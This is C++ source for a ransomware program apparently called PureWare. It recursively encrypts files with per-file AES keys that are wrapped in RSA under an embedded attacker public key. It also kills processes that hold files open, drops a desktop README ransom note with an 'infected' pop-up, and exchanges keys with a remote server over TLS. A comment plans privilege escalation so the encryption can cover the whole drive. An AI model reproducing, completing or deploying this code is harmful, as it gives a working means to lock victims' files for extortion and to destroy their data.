#include "PureWare.hpp"

using namespace std;
auto file_logger = spdlog::basic_logger_mt("file_logger", "logs/my_log.txt");

void traverseDirectory(const path_t& path, std::vector<path_t>& pathToCrypt);
void keysSetup(string* encryptedPrivateKey, std::vector<std::string>* encryptedAESKeys, std::vector<std::vector<CryptoPP::byte>>* AESkeys, std::vector<path_t>& pathToCrypt);
CryptoPP::RSA::PublicKey ourKey();
std::pair<CryptoPP::RSA::PrivateKey, CryptoPP::RSA::PublicKey> GenerateRSAKey(int keyLength);
void GenerateAESKey(CryptoPP::byte key[CryptoPP::AES::DEFAULT_KEYLENGTH]);
std::string RSAEncrypt(const CryptoPP::RSA::PublicKey& publicKey, const std::string& plain);
std::string RSADecrypt(const CryptoPP::RSA::PrivateKey& privateKey, const std::string& cipher);
void AESEncrypt(const CryptoPP::byte key[CryptoPP::AES::DEFAULT_KEYLENGTH], const std::string& filename);
void AESDecrypt(const CryptoPP::byte key[CryptoPP::AES::DEFAULT_KEYLENGTH], const std::string& filename);
std::string hybrEncrypt(const CryptoPP::byte key[CryptoPP::AES::DEFAULT_KEYLENGTH], const std::string& plain);
void checkIfInUse(std::filesystem::path filePath);
void terminateProcessById(DWORD processId);
void keyTransfer(string encrRSAkeyStr, std::vector<std::string> encrAESkeys, std::vector<path_t>& pathToDecrypt);

int main(int argc, char* argv[])
{
    setlocale(LC_ALL, "Russian");
    path_t directory = "C:/Users/-/Desktop/PureWare";
    std::vector<path_t> pathToCrypt;

    file_logger->set_level(spdlog::level::info);
    file_logger->info("start the Cript");

    traverseDirectory(directory, pathToCrypt);

    std::string encryptedPrivateKey;
    std::vector<std::string> encryptedAESKeys;
    std::vector<std::vector<CryptoPP::byte>> AESkeys;
    keysSetup(&encryptedPrivateKey, &encryptedAESKeys, &AESkeys, pathToCrypt);

    auto keyIter = AESkeys.begin();
    for (const auto& NextFile : pathToCrypt) {
        file_logger->info("path {}", NextFile.string());
        if (std::filesystem::is_regular_file(NextFile)) {
            AESEncrypt(keyIter->data(), NextFile.string());
        }
        std::memset(keyIter->data(), 0, keyIter->size());
        ++keyIter;
    }

    NoteModule warn_user;
    warn_user.NotifyUsersAboutWorkResults();
    keyTransfer(encryptedPrivateKey, encryptedAESKeys, pathToCrypt);
    return 0;
}

void traverseDirectory(const path_t& path, std::vector<path_t>& pathToCrypt) {
    try {
        if (filesystem::exists(path) && filesystem::is_directory(path)) {
            bool isEmpty = true;
            for (const auto& entry : filesystem::directory_iterator(path)) {
                auto filePath = entry.path();
                // Skip specific directories
                if (filePath == "C:/Documents and Settings" || filePath == "C:/System Volume Information") {
                    continue;
                }

                if (entry.is_directory()) {
                    // Recursive call to traverse subdirectories
                    traverseDirectory(filePath, pathToCrypt);
                    isEmpty = false;
                }
                else if (entry.is_regular_file()) {
                    // Add file to the vector
                    pathToCrypt.emplace_back(filePath);
                    isEmpty = false;
                }
            }

            if (!isEmpty) {
                // Add non-empty directory to the vector
                pathToCrypt.emplace_back(path);
            }
        }
    }
    catch (const filesystem::filesystem_error& e) {
        file_logger->error("Filesystem error : {}", e.what());
    }
    catch (const std::exception& e) {
        file_logger->error("Standard exception:  {}", e.what());
    }
    catch (...) {
        file_logger->error("Unknown error occurred last:  {}", GetLastError());
    }
}

void keysSetup(string* encryptedPrivateKey, std::vector<std::string>* encryptedAESKeys, std::vector<std::vector<CryptoPP::byte>>* AESkeys, std::vector<path_t>& pathToCrypt)
{
    // Generate RSA keys pair
    int keyLength = 2048;
    auto keyPair = GenerateRSAKey(keyLength);

    // Convert private key to string
    CryptoPP::ByteQueue queue;
    keyPair.first.Save(queue);
    std::string privateKeyStr;
    CryptoPP::StringSink ss(privateKeyStr);
    queue.CopyTo(ss);
    ss.MessageEnd();
    queue.Clear();

    // Ecrypt generated RSA private key with our public key through hybrid encryption
    CryptoPP::RSA::PublicKey key0 = ourKey();
    CryptoPP::byte hybrKey[CryptoPP::AES::DEFAULT_KEYLENGTH];
    GenerateAESKey(hybrKey);
    std::string hybrKeyStr(reinterpret_cast<char*>(hybrKey), CryptoPP::AES::DEFAULT_KEYLENGTH);
    std::string encryptedHybrKey = RSAEncrypt(key0, hybrKeyStr);
    *encryptedPrivateKey = hybrEncrypt(hybrKey, privateKeyStr) + "AMOGUS" + encryptedHybrKey;
    std::memset(hybrKey, 0, sizeof(hybrKey));

    // Serialize RSA private key into a byte array and clear it
    keyPair.first.DEREncode(queue);
    size_t length = queue.CurrentSize();
    CryptoPP::byte* buffer = new CryptoPP::byte[length];
    queue.Get(buffer, length);
    queue.Clear();
    std::memset(buffer, 0, length);
    delete[] buffer;

    // Encrypt AES keys with generated RSA public key
    for (const auto& NextFile : pathToCrypt) {
        CryptoPP::byte AESkey[CryptoPP::AES::DEFAULT_KEYLENGTH];
        GenerateAESKey(AESkey);
        std::string aesKeyStr(reinterpret_cast<char*>(AESkey), CryptoPP::AES::DEFAULT_KEYLENGTH);
        std::string encryptedAESKey = RSAEncrypt(keyPair.second, aesKeyStr);
        encryptedAESKeys->push_back(encryptedAESKey);
        std::vector<CryptoPP::byte> AESkeyVec(AESkey, AESkey + CryptoPP::AES::DEFAULT_KEYLENGTH);
        AESkeys->push_back(AESkeyVec);
    }
}

CryptoPP::RSA::PublicKey ourKey()
{
    // Predetermined RSA public key in Base64 format
    std::string publicKeyBase64 =
        "MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAzU6CQOK5B5PjilZSYXf1"
        "GqGKFcwudCQDBi2o9I6lO3yGJfkTgZ4q1feRQh8NiVOPq+JFg2y2I0yBq+0rDpyB"
        "Tht+iO2Hzj8RSIcVaI7qP5vj1PD8vgG4GZx7MNdf3H2X9qJAdWG4vckZYT0t2ZWK"
        "kTjS8BjZE5B5H5ZcwZTXMF6v0BcJa2FqFJSRZ+aHM2j/6F1huh+0D7UWux4zVBvC"
        "YQ1UH6A+zd3VqRVQza8Jv5I4Hun2N06suHjTTPTZnV6TrQb2a2F7A5BjqNUCBsvq"
        "z6ItDZvgIFMjZgoAH2+PiQUnRcYyNjzx0YxEzyq9n3xumGeTqobGA5HXFNjbxAlu"
        "wQIDAQAB";

    // Convert the Base64-encoded key to a ByteQueue
    CryptoPP::ByteQueue bytes;
    CryptoPP::StringSource ss(publicKeyBase64, true, new CryptoPP::Base64Decoder);
    ss.TransferTo(bytes);
    bytes.MessageEnd();

    // Load the public key from the ByteQueue
    CryptoPP::RSA::PublicKey publicKey;
    publicKey.Load(bytes);
    return publicKey;
}

std::pair<CryptoPP::RSA::PrivateKey, CryptoPP::RSA::PublicKey> GenerateRSAKey(int keyLength)
{
    // Create a random number generator
    CryptoPP::AutoSeededRandomPool rng;

    // Generate random RSA function parameters with the specified key length
    CryptoPP::InvertibleRSAFunction parameters;
    parameters.GenerateRandomWithKeySize(rng, keyLength);

    // Generate keys
    CryptoPP::RSA::PrivateKey privateKey(parameters);
    CryptoPP::RSA::PublicKey publicKey(parameters);

    return { privateKey, publicKey };
}

void GenerateAESKey(CryptoPP::byte key[CryptoPP::AES::DEFAULT_KEYLENGTH])
{
    // Create a random number generator
    CryptoPP::AutoSeededRandomPool rng;

    // Generate random key
    rng.GenerateBlock(key, CryptoPP::AES::DEFAULT_KEYLENGTH);
}

std::string RSAEncrypt(const CryptoPP::RSA::PublicKey& publicKey, const std::string& plain)
{
    // Create a random number generator
    CryptoPP::AutoSeededRandomPool rng;

    // Create an RSA encryptor with the public key
    CryptoPP::RSAES_OAEP_SHA_Encryptor encryptor(publicKey);

    // Encrypt the plaintext and store it in 'cipher'
    std::string cipher;
    CryptoPP::StringSource ss1(plain, true,
        new CryptoPP::PK_EncryptorFilter(rng, encryptor,
            new CryptoPP::StringSink(cipher)
       ) 
    ); 

    return cipher;
}

std::string RSADecrypt(const CryptoPP::RSA::PrivateKey& privateKey, const std::string& cipher)
{
    // Create a random number generator
    CryptoPP::AutoSeededRandomPool rng;

    // Create an RSA decryptor with the private key
    CryptoPP::RSAES_OAEP_SHA_Decryptor decryptor(privateKey);

    // Decrypt the ciphertext and store it in 'recovered'
    std::string recovered;
    CryptoPP::StringSource ss2(cipher, true,
        new CryptoPP::PK_DecryptorFilter(rng, decryptor,
            new CryptoPP::StringSink(recovered)
        )
    );

    return recovered; 
}

void AESEncrypt(const CryptoPP::byte key[CryptoPP::AES::DEFAULT_KEYLENGTH], const std::string& filename)
{
    // Create a random number generator
    CryptoPP::AutoSeededRandomPool rng;

    // Generate a random initialization vector
    CryptoPP::byte iv[CryptoPP::AES::BLOCKSIZE];
    rng.GenerateBlock(iv, sizeof(iv));

    // Create an AES encryptor with the key and initialization vector
    CryptoPP::CFB_Mode<CryptoPP::AES>::Encryption encryptor(key, CryptoPP::AES::DEFAULT_KEYLENGTH, iv);

    // Read the entire file into a string
    std::string plain;
    CryptoPP::FileSource fs(filename.c_str(), true, new CryptoPP::StringSink(plain));

    // Encrypt the plaintext and store it in 'cipher'
    std::string cipher;
    CryptoPP::StringSource ss(plain, true,
        new CryptoPP::StreamTransformationFilter(encryptor,
            new CryptoPP::StringSink(cipher)
        )
    );

    // Write the cipher back to the file
    CryptoPP::StringSource ss2(cipher, true, new CryptoPP::FileSink(filename.c_str()));
}

void AESDecrypt(const CryptoPP::byte key[CryptoPP::AES::DEFAULT_KEYLENGTH], const std::string& filename)
{
    // Create a random number generator
    CryptoPP::AutoSeededRandomPool rng;

    // Generate a random initialization vector
    CryptoPP::byte iv[CryptoPP::AES::BLOCKSIZE];
    rng.GenerateBlock(iv, sizeof(iv));

    // Create an AES decryptor with the key and initialization vector
    CryptoPP::CFB_Mode<CryptoPP::AES>::Decryption decryptor(key, CryptoPP::AES::DEFAULT_KEYLENGTH, iv);

    // Read the entire file into a string
    std::string cipher;
    CryptoPP::FileSource fs(filename.c_str(), true, new CryptoPP::StringSink(cipher));

    // Decrypt the ciphertext and store it in 'recovered'
    std::string recovered;
    CryptoPP::StringSource ss(cipher, true,
        new CryptoPP::StreamTransformationFilter(decryptor,
            new CryptoPP::StringSink(recovered)
        )
    );

    // Write the recovered back to the file
    CryptoPP::StringSource ss2(recovered, true, new CryptoPP::FileSink(filename.c_str()));
}

std::string hybrEncrypt(const CryptoPP::byte key[CryptoPP::AES::DEFAULT_KEYLENGTH], const std::string& plain)
{
    // Create a random number generator
    CryptoPP::AutoSeededRandomPool rng;

    // Generate a random initialization vector
    CryptoPP::byte iv[CryptoPP::AES::BLOCKSIZE];
    rng.GenerateBlock(iv, sizeof(iv));

    // Create an AES encryptor with the key and initialization vector
    CryptoPP::CFB_Mode<CryptoPP::AES>::Encryption encryptor(key, CryptoPP::AES::DEFAULT_KEYLENGTH, iv);

    // Encrypt the plaintext and store it in 'cipher'
    std::string cipher;
    CryptoPP::StringSource ss(plain, true,
        new CryptoPP::StreamTransformationFilter(encryptor,
            new CryptoPP::StringSink(cipher)
        )
    );

    return cipher;
}

void checkIfInUse(std::filesystem::path filePath)
{
    // Start a new Restart Manager session
    DWORD dwSession;
    WCHAR szSessionKey[CCH_RM_SESSION_KEY + 1] = { 0 };
    DWORD dwError = RmStartSession(&dwSession, 0, szSessionKey);
    if (dwError != ERROR_SUCCESS) {
        file_logger->error("RmStartSession failed: ", dwError);
        return;
    }

    // Register resources (files) to a Restart Manager session
    LPCWSTR filePaths[] = { filePath.c_str() };
    dwError = RmRegisterResources(dwSession, 1, filePaths, 0, NULL, 0, NULL);
    if (dwError != ERROR_SUCCESS) {
        file_logger->error("RmRegisterResources failed: ", dwError);
        RmEndSession(dwSession);
        return;
    }

    // Get the list of processes that are using the file
    DWORD dwReason;
    UINT nProcInfoNeeded = 0;
    UINT nProcInfo = 0;
    UINT ProcAm = 0;
    RM_PROCESS_INFO* pids = nullptr;
    dwError = RmGetList(dwSession, &nProcInfoNeeded, &nProcInfo, NULL, &dwReason);

    // Some process is using the file - allocate space and call RmGetList again
    if (dwError == ERROR_MORE_DATA) {
        nProcInfo = nProcInfoNeeded;
        delete[] pids;
        pids = new RM_PROCESS_INFO[nProcInfo]();
        ProcAm = nProcInfo;
        dwError = RmGetList(dwSession, &nProcInfoNeeded, &nProcInfo, pids, &dwReason);
    }

    if (dwError == ERROR_SUCCESS && pids != nullptr) {
        for (UINT i = 0; i < ProcAm; ++i) {
            terminateProcessById(pids[i].Process.dwProcessId);
        }
    }
    else {
        file_logger->error("RmGetList failed: ", dwError);
    }

    delete[] pids;

    // End the Restart Manager session
    RmEndSession(dwSession);
}

void terminateProcessById(DWORD processId)
{
    HANDLE processHandle = NULL;

    // Open the process
    processHandle = OpenProcess(PROCESS_TERMINATE, FALSE, processId);

    if (processHandle == NULL) {
        file_logger->error("OpenProcess() failed: ", GetLastError());
        return;
    }

    // Terminate the process
    if (!TerminateProcess(processHandle, 1)) {
        file_logger->error("TerminateProcess() failed: ", GetLastError());
    }

    // Close the process handle
    CloseHandle(processHandle);
}

void keyTransfer(string encrRSAkeyStr, std::vector<std::string> encrAESkeys, std::vector<path_t>& pathToDecrypt)
{
    // Initialize Winsock
    WSADATA wsaData;
    if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0) {
        file_logger->error("Failed to initialize winsock: ", GetLastError());
        return;
    }

    // Initialize OpenSSL
    SSL_load_error_strings();
    OpenSSL_add_ssl_algorithms();

    // Create a socket
    SOCKET sock = socket(AF_INET, SOCK_STREAM, 0);
    if (sock == INVALID_SOCKET) {
        file_logger->error("Failed to create socket: ", GetLastError());
        WSACleanup();
        return;
    }

    // Setup the server address structure
    sockaddr_in serverAddress{};
    serverAddress.sin_family = AF_INET;
    serverAddress.sin_port = htons(12345);  // Server port
    if (inet_pton(AF_INET, "127.0.0.1", &serverAddress.sin_addr) <= 0) {  // Server IP
        file_logger->error("Failed to setup server address: ", GetLastError());
        closesocket(sock);
        WSACleanup();
        return;
    }

    // Connect to the server
    if (connect(sock, reinterpret_cast<struct sockaddr*>(&serverAddress), sizeof(serverAddress)) < 0) {
        file_logger->error("Failed to connect to server: ", GetLastError());
        closesocket(sock);
        WSACleanup();
        return;
    }

    // Create a new SSL structure and assign it to our connection
    const SSL_METHOD* method = TLS_client_method();
    SSL_CTX* ctx = SSL_CTX_new(method);
    SSL* ssl = SSL_new(ctx);
    SSL_set_fd(ssl, sock);

    // Perform TLS handshake
    if (SSL_connect(ssl) <= 0) {
        file_logger->error("Failed to perform SSL/TLS handshake: ", ERR_reason_error_string(ERR_get_error()));
        SSL_free(ssl);
        closesocket(sock);
        WSACleanup();
        return;
    }

    // Send encryption key to the server
    send(sock, encrRSAkeyStr.c_str(), encrRSAkeyStr.size(), 0);

    // Receive decryption key from the server
    string decrRSAkeyStr;
    char buffer[2048] = { 0 };
    while (true) {
        int bytesRead = recv(sock, buffer, sizeof(buffer) - 1, 0);
        if (bytesRead <= 0) {
            break;
        }
        buffer[bytesRead] = '\0';
        decrRSAkeyStr += buffer;
    }

    // Convert our string to actual key
    CryptoPP::ByteQueue queue;
    CryptoPP::StringSource ss(decrRSAkeyStr, true, new CryptoPP::Redirector(queue));
    CryptoPP::RSA::PrivateKey decrRSAkey;
    decrRSAkey.Load(queue);
    queue.Clear();

    // Decrypt AES keys and all files
    CryptoPP::byte decrAESkey[CryptoPP::AES::DEFAULT_KEYLENGTH];
    auto keyIter = encrAESkeys.begin();
    for (const auto& NextFile : pathToDecrypt) {
        std::string decrAESKeyStr = RSADecrypt(decrRSAkey, keyIter->data());
        memcpy(decrAESkey, decrAESKeyStr.data(), CryptoPP::AES::DEFAULT_KEYLENGTH);
        AESDecrypt(decrAESkey, NextFile.string());
        ++keyIter;
    }

    // Perform cleanup
    SSL_free(ssl);
    SSL_CTX_free(ctx);
    closesocket(sock);
    WSACleanup();
}

// Public method that writes user's home directory to the private class variable "directory"
void FileModule::FindDirectory() {

    std::string homeDir;
    PWSTR directoryPath = nullptr;

    // Here we should run the PrivEsc class module and if it returns true, then start working from the 'C:\' i.e.
    // and if it returns false, just take the user's home directory

    // works from Windows Vista and later, alternative for elders's - SHGetFolderPath
    if (SUCCEEDED(SHGetKnownFolderPath(FOLDERID_Profile, 0, nullptr, &directoryPath))) {
        directoryPath_ = directoryPath;
    }

    CoTaskMemFree(directoryPath); // need to free because SHGetKnownFolderPath allocates address and stores path in it

}


// NoteModule implementation starts here

NoteModule::NoteModule() : Note_that_would_be_set_in_file(L"Your PC's files were encrypted.\n") {
}

NoteModule::NoteModule(std::wstring Note_that_would_be_set_in_file) : Note_that_would_be_set_in_file(Note_that_would_be_set_in_file) {
}

// This method notifies user about program.
// Starts windows to attract attetnion and creates REAME file with needed explanations.
void NoteModule::NotifyUsersAboutWorkResults() {
    // Getting the path to the user's desktop
    wchar_t desktopPath[MAX_PATH];
    SHGetFolderPathW(NULL, CSIDL_DESKTOP, NULL, 0, desktopPath);

    // Creating the full path of the README.txt file
    path_t README_file_path = path_t(desktopPath) / L"README.txt";
    Create_README_file(README_file_path);

    // Message Box that notifies user about encrypting files and asks to read README
    int msgboxID = MessageBox(
        NULL,
        "Your PC is infected!\nCheck the README.txt file on your desktop.\nPush \"Yes\" button to open the file right now.",
        "CHECK README!",
        MB_ICONEXCLAMATION | MB_YESNO
    );

    // If msbox's "Yes" button was pushed - open README.
    if (msgboxID == IDYES) {
        ShellExecute(NULL, "open", README_file_path.string().c_str(), NULL, NULL, SW_SHOWNORMAL);
    }
}

// Method that creates README file at Desktop
void NoteModule::Create_README_file(const path_t& README_path) {
    // Checking the file's existence and creating if not 
    std::filesystem::create_directories(README_path.parent_path());

    // Opening a file for writing
    std::wofstream out(README_path);
    if (!out) {
        std::cerr << "Не удалось открыть файл для записи, по пути:" << README_path << std::endl;
        return;
    }

    // Moving variable's content into a file
    out << Note_that_would_be_set_in_file << std::endl;

    // out is closed automatically due to the destructor
}

// NoteModule implementation ends here
